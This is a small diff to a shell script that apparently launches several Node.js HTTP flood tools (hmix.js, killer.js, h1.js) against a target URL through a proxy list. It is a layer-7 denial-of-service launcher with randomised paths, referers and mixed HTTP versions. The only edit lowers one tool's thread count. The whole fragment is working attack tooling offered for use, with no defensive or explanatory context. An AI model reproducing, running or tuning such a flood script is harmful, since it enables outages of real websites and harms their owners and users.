@@ -14,7 +14,7 @@ done > live.txt
 export NODE_OPTIONS=--max-old-space-size=8192
 
 node hmix.js -m POST -u "$URL" -s "$TIME" -p live.txt -t 1 --full true -d false &
-node killer.js POST "$URL" "$TIME" 10 128 live.txt --query 1 --referer rand --http mix --close --randpath --parsed --reset --multipath 5 &
+node killer.js POST "$URL" "$TIME" 1 128 live.txt --query 1 --referer rand --http mix --close --randpath --parsed --reset --multipath 5 &
 
 node h1.js POST "$URL" live.txt "$TIME" 999 10 randomstring="true" &
 node h1.js GET "$URL" live.txt "$TIME" 999 10 randomstring="true" &
